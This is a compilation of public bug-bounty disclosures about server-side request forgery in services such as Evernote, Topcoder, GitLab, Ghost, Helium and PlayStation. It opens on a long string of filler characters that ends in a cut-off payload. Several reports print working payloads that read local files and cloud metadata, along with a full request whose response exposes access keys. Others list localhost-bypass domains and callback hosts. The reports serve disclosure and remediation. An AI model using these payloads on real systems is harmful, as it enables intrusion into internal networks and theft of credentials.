AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://YOUR_HOST/
`


## Recommendations
patch apache


Thanks

## Impact

ssrf

---

### [Local file disclosure through SSRF at next.nutanix.com](https://hackerone.com/reports/471520)

- **Report ID:** `471520`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Nutanix
- **Reporter:** @tosun
- **Bounty:** - usd
- **Disclosed:** 2022-04-25T22:27:40.334Z
- **CVE(s):** -

**Summary (team):**

Issue marked resolved and test fixed in January 2019.

---

### [Full read SSRF via Lark Docs `import as docs` feature ](https://hackerone.com/reports/1409727)

- **Report ID:** `1409727`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Lark Technologies
- **Reporter:** @sirleeroyjenkins
- **Bounty:** 5000 usd
- **Disclosed:** 2022-01-28T01:51:18.596Z
- **CVE(s):** -

**Summary (team):**

A SSRF (server side request forgery) vulnerability was found in the LarkDocs using the "import as docs" feature, which could have potentially been used to access services running on the internal network. We thank @sirleeroyjenkins for reporting this to our team and confirming the resolution.

---

### [Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion](https://hackerone.com/reports/1189367)

- **Report ID:** `1189367`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Evernote
- **Reporter:** @neolex
- **Bounty:** - usd
- **Disclosed:** 2021-12-06T21:41:59.141Z
- **CVE(s):** -

**Summary (team):**

## Summary:
The following endpoint was found to be vulnerable to SSRF :  `https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jdGVzdC5qcw==/-1430533899.js`

The endpoint take a path in url and retrieve its content. it is supposed to be use on path but it can be used on URL to get access to internal network :SSRF
And It can also be used with file uri : Local file inclusion.



## Steps To Reproduce:

### Leak Local file:
* Open the following url : 
https://www.evernote.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js

The payload is base64 encoded of : `file:///home/abenavides/#.js`

the # is used because the end of the url must be in javascript but to ignore it in uri i made it after the #

it leaks the content of the directory : 
███

you can also leak file with : https://www.evernote.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js
███████

### SSRF : 
You can also use url to trigger SSRF : 
* To have access to aws metadata you can use the following url : 
https://www.evernote.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js

█████

## Impact

The impact is critical.
An attacker can leak abitrary file in the webserver of www.evernote.com
And access any internal host of evernote, including awsmetadata with full response read.

I didn't tried to escalate the bug to not "cross the line", and because I think it clearly demonstrate the critical impact already.

Best regards.

**Summary (researcher):**

Critical SSRF on evernote,
I made a blog post about this vulnerability here : https://blog.neolex.dev/13/
Best regards

---

### [SSRF to AWS file read](https://hackerone.com/reports/978823)

- **Report ID:** `978823`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Lab45
- **Reporter:** @zhh
- **Bounty:** - usd
- **Disclosed:** 2021-09-16T22:30:13.060Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
after seeing the disclosure it looks like the bug was not fixed properly

## Steps To Reproduce:
copy and paste the request below and paste it into Burpsuite repeater

`GET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1
Host: cognitive.topcoder.com
Content-Length: 108
Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://cognitive.topcoder.com
Referer: http://cognitive.topcoder.com/ibm-cloud
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9`

`b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net`



##Response
`HTTP/1.1 200 OK
Date: Fri, 11 Sep 2020 01:28:12 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: AWSALB=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/
Set-Cookie: AWSALBCORS=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/; SameSite=None
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
ETag: W/"512-LkSYc5PU5Y4xWGPxqoM8orPaKK0"
Vary: Accept-Encoding
Content-Length: 1298`

`{
  "Code" : "Success",
  "LastUpdated" : "2020-09-11T00:36:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAV6SVWBIPVJNDI4LO",
  "SecretAccessKey" : "wAwYDQcsfEMUyku//RxXI/NjdAMUtRLj4cfSiEVQ",
  "Token" : "IQoJb3JpZ2luX2VjEGEaCXVzLWVhc3QtMSJIMEYCIQD8srpZ/87c2HrLYddytORezee2NMx0/PWk4UH+2nahPgIhAOwlCmFgVAcdsUBpbDHI6McTLQcHlUnA/FAMOf5GoMWmKrQDCGoQABoMNDA5Mjc1MzM3MjQ3Igw+zvAcQIYJijsNTWsqkQMfVMu7kgOepBvF96NdZHk4KxICWOBDlrJN/MR9o3Hf6Ohst+4d/tbGeyCL7xClsepu+02nf/sX7Ggtx9ciqAg14OmsUWjzp4ZHntge0oi9AJpfyc76UVFNFdTwbo/hEEHKfjgC18lFW+E5DIP00Ifm7usFgLLABozP9Av/hJLwCWG7UHfnHicvc0eY9Tscc+RS4U0GWvUGGXji1vm/8ud5c7Ou6h2z2fo9fSODgq/c1sZReVtofuhSYOfpYtr4ByrHMVY78aR+VrF//6870MUJWNOI4EK3NFxtPH6HCJRmBwh3iVTqYI+vawove6BG3PmMkeyBZSqCqFCTuf+H/eEdw6orjNQ7BxurtB8ZaymaUABhNKfQTBeDBy8/G/wK75v7YZjPUmalMf89wGvshp5EHQVYySr3RGlS9Ti5FbIzR0Gl+5cLx/0AX6ce8L5UrXACpOLktOJe+l/W1KQchNOs9MEwSTYi+sa1qITd17XS9tp0BuRlZSX4MGQ0SJvDEmNvQq84avF4SLbqJLNZEVn0uDCkjev6BTrqAb5BqJ09VpgjlBloe0SAGp4uNlWheqWl+Vt3S+jcVRqf4LNAM3hbEvRB6pTt9itSE6l4y40QADcmMs0oWc6sm+oCG5enAkRxQBFYFDt+OvbxnSnQmaG3YDuRRJwpsaMA/V0TLqpQq5wvJMOssylXffenYIFpVIbZ5BQ5elDVqVpol/1fe+ej3slNvG6VqD3/OwLyNPjfAhdG3UmYzqyr3ym6uywn0KmLMY9esM7Mde5KA2LmgozCKpkV18u0LGCORGXGnllCWpuifVMYXoLQJgk8LCB5H6FbBbcqVvE5FGabClXZG3UIbhPsfg==",
  "Expiration" : "2020-09-11T06:47:23Z"
}`


## Supporting Material/References:
video PoC: F983368

## Impact

aws file read

---

### [FogBugz import attachment full SSRF requiring vulnerability in *.fogbugz.com](https://hackerone.com/reports/1092230)

- **Report ID:** `1092230`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2021-07-13T13:15:39.797Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Hi Team, a bit of a odd one here. The FogBugz import code uses `CarrierWave::Uploader::Base:download!` to download attachments from fogbugz.com when importing a FogBugz repository. `CarrierWave::Uploader::Base:download!` ultimately uses `Kernel.Open` to download the provided attachment URL. `Kernel.Open` permits URLs which resolve to, or redirect to `127.0.0.1`, making it vulnerable to SSRF issues. There is a check within the FogBugz import code which requires attachments to be downloaded with an `http` or `https` scheme from a fogbugz.dom subdomain:

`app/services/projects/download_service.rb`
```rb
   
WHITELIST = [
  /^[^.]+\.fogbugz.com$/
].freeze

...
    
def valid_url?(url)
  url && http?(url) && valid_domain?(url)
end

def http?(url)
  url =~ /\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\z/
end

def valid_domain?(url)
  host = URI.parse(url).host
  WHITELIST.any? { |entry| entry === host }
end
```

If a vulnerability can be identified in a fogbugz.com subdomain which results in returning a crafted API response including an arbitrary attachment URL, a full read GET based SSRF would be exploitable on gitlab.com (or a gitlab instance). I've done some basic analysis on potential vulnerabilities which could trigger this issue, they include (but are by no means limited to):
* URL parameter clobbering to force a 302 redirect on attachment download
* Intercept and modify an unencrypted HTTP API response
* Subdomain takeover / dangling sub domain to return an arbitrary API response
* HTTP Request smuggling to modify an in-flight API response
* Cache poisoning to poison a malicious API response
* SQL Injection to replace an attachment URL
* Code Execution to modify `api.asp` to return an arbitrary API response
* Social engineering / malicious insider FogBugz employee

Due to the third party nature of these issues it is not feasible to probe for, or disclose the potential existence of, any of these potential issues on fogbugz.com to GitLab. However, if any one of these issues exists now or in the future it would render gitlab.com vulnerable.

## Steps to reproduce:

This issue can be simulated by placing an `/etc/hosts` entry on a GitLab server as follows:
```
198.211.125.160 poc.fogbugz.com
```

This will point `poc.fogbugz.com` to a VPS I control, which responds with a crafted FogBugz API response designed to simulate the exploitation of a bug on a fogbugz.com domain. Importing the `SSRF Repository` FogBugz repository from this host will create a repository with a single issue which includes the SSRF result of requesting http://127.0.0.1:9090/api/v1/targets.

{F1179855}

## Impact:

A vulnerability in a fogbugz.com subdomain, which meets the above criteria, would result in a full GET based SSRF issue against gitlab.com.

## What is the current *bug* behavior?

FogBugz import code uses `Kernel.Open` to download and store the result of an untrusted URL.

## What is the expected *correct* behavior?

`GitLab::Http` should be used to download attachments to prevent SSRF attacks.

## Output of checks:
### Results of GitLab environment info

```
System information
System:         Ubuntu 20.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.2p137
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.3
Redis Version:  5.0.9
Git Version:    2.29.0
Sidekiq Version:5.2.9
Go Version:     unknown

GitLab information
Version:        13.8.1-ee
Revision:       e10a21e66ce
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.4
URL:            http://188.166.97.195
HTTP Clone URL: http://188.166.97.195/some-group/some-project.git
SSH Clone URL:  git@188.166.97.195:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        13.15.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

A vulnerability in a fogbugz.com subdomain, which meets the above criteria, would result in a full GET based SSRF issue against gitlab.com.

---

### [Bypass of SSRF Vulnerability](https://hackerone.com/reports/879803)

- **Report ID:** `879803`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Node.js third-party modules
- **Reporter:** @njgadhiya
- **Bounty:** - usd
- **Disclosed:** 2021-06-28T08:34:16.514Z
- **CVE(s):** -

**Vulnerability Information:**

##Bypass of SSRF report https://hackerone.com/reports/793704 

Fix applied after reporting the actual report did not prevent from SSRF issue.
https://github.com/TryGhost/Ghost/commit/47739396705519a36018686894d1373e9eb92216#diff-3aa52b4b8c6e0fb8422de65648e35887R101

The function fetchOembedData() only validates, IPv4, IPv6 and localhost:

if (!HTTP_REGEX.test(protocol) || hostname === 'localhost' || IPV4_REGEX.test(hostname) || IPV6_REGEX.test(hostname))

However, it is possible that an attacker would be able to bypass localhost validations with following domains or such:

http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost

##Recommendation 
In order to fix, this vulnerability all the URL provided with "/ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed" and URLs getting as a response should be resolved and it should again pass through the filters added to above functions.

## Impact

* An attacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance's to internal external network.

---

### [SSRF By adding a custom integration on console.helium.com](https://hackerone.com/reports/1055823)

- **Report ID:** `1055823`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Helium
- **Reporter:** @th0roid
- **Bounty:** 500 usd
- **Disclosed:** 2021-05-26T19:26:24.778Z
- **CVE(s):** -

**Vulnerability Information:**

A Server Side Request Forgery vulnerability was found in the *Add a custom Integration* feature on *console.helium.com*. By creating a custom HTTP integration, and setting the integration endpoint to http://169.254.169.254/latest/meta-data private meta-data from the AWS EC2 instance running can be retrieved.

{F1111768}

{F1111767}

The server makes the HTTP request and sets the response body  as the integration message every time that the device sends a packet. As the endpoint input is not validated, this makes the application vulnerable to a critical SSRF.

{F1111779}

{F1111780}

Endpoint set as: http://169.254.169.254/latest/meta-data/ami-id

{F1111781}

## Impact

By exploiting this vulnerability an attacker can get access to the server internal network and access private and critical information.

---

### [External Service Interaction (HTTP/DNS) on https://www.███  (██████████ parameter)](https://hackerone.com/reports/997376)

- **Report ID:** `997376`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fiveguyslover
- **Bounty:** - usd
- **Disclosed:** 2021-04-02T18:44:50.725Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings, i've find a External service interaction (HTTP/DNS) on https://www.███████

```
External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, 
such as a web or mail server. 
The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, 
and in some cases might even be the intended behavior of the application. 
However, in many cases, it can indicate a vulnerability with serious consequences.

In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, 
and these are reported as separate issues.
 If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, 
then this strongly indicates that the application attempted to connect using that other service, 
but was prevented from doing so by egress filters in place at the network layer. 
The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. 
By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
This may include public third-party systems, internal systems within the same organization, 
or services available on the local loopback adapter of the application server itself. Depending on the network architecture, 
this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.
```
https://portswigger.net/kb/issues/00300200_external-service-interaction-dns

Full link  : https://www.██████/█████

POST Request : 

```
████████&MONTH=01&LNAME=frenchvlad&PHONE=555-555-0199&EDULVL=10&STATE=AL&EMAILFLAG=on&submitButton=Submit+Audition+Request&EMAIL=frenchvlad@example.com&ADD1=555-555-0199@frenchvlad.com&██████=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville&ADD2=555-555-0199@frenchvlad.com&INST1MOS=Bass+Guitar&CITY=Winterville&YEAR=2003&INST1YRS=2+TO+5&DAY=01&CITIZEN=R
```

my payload : `█████████=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville`

Proof (DNS) : 

██████

Proof (HTTP) : 

█████

best regards, 
frenchvlad

## Impact

We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too

---

### [SSRF chained to hit internal host leading to another SSRF which allows to read internal images.](https://hackerone.com/reports/826097)

- **Report ID:** `826097`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** PlayStation
- **Reporter:** @bugdiscloseguys
- **Bounty:** 1000 usd
- **Disclosed:** 2021-03-30T04:17:19.052Z
- **CVE(s):** -

**Summary (team):**

## Report Summary:

We found an SSRF at https://image.api.np.km.playstation.net/ 

Vulnerable endpoints: `/images` , `/dis/images`. using image GET parameter.

##Description

This endpoint allows us to fetch a remote image over HTTP protocol using the `image` GET parameter and convert them to the desired format using the GET parameter `format`.

We found that this could hit internal hosts however the response needs to be a valid image and also `file` protocol isn't working here.

For example :

The host https://store.mgmt.playstation.com/ (**mgmt** keywords hosts are meant to be internal for PSN) will respond with a 403 however I found it hosts an image that can open using this SSRF. 

